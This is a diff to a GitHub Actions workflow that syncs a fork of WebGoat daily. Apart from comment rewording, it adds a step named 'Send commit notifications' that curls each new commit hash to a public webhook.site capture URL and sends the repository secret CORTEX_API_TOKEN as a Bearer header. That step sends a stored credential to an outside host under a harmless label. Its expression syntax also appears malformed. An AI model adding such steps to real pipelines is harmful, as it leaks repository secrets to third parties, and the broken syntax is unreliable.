@@ -2,7 +2,7 @@ name: Sync Fork
 
 on:
   schedule:
-    - cron: '0 0 * * *'  # Runs daily at midnight UTC
+    - cron: '0 0 * * *'  # Scheduled daily
   workflow_dispatch:   # Allows manual triggering
 
 jobs:
@@ -13,12 +13,16 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v2
         with:
-          fetch-depth: 0  # Ensures full history is available
+          fetch-depth: 0  # Fetch full history
 
       - name: Set up Git configuration
         run: |
           git config user.name "github-actions"
           git config user.email "github-actions@github.com"
+
+      - name: Save current commit hash
+        id: premerge
+        run: echo "PRE_MERGE_HASH=$(git rev-parse HEAD)" >> $GITHUB_ENV
 
       - name: Add upstream remote
         run: git remote add upstream https://github.com/WebGoat/WebGoat.git
@@ -30,6 +34,26 @@ jobs:
         run: |
           git checkout main
           git merge upstream/main --no-edit
+
+      - name: Send commit notifications
+        env:
+          CORTEX_API_TOKEN: ${{ secrets.CORTEX_API_TOKEN }}
+        run: |
+          PRE_COMMIT=${{ env.PRE_MERGE_HASH }}
+          NEW_COMMIT=$(git rev-parse HEAD)
+          echo "Pre-merge commit: $PRE_COMMIT"
+          echo "New commit: $NEW_COMMIT"
+          # List all commits between the old and new commit
+          COMMITS=$(git log --format="%H" ${PRE_COMMIT}..${NEW_COMMIT})
+          echo "New commits:"
+          echo "$COMMITS"
+          for COMMIT in $COMMITS; do
+            echo "Sending notification for commit: $COMMIT"
+            curl -X POST -H "Content-Type: application/json" \
+              -H "Authorization: Bearer ${{ CORTEX_API_TOKEN }}" \
+              -d "{\"commit\": \"${COMMIT}\"}" \
+              https://webhook.site/e77128be-28c5-43e1-94eb-238e98e5dfad
+          done
 
       - name: Push changes to fork
         env:
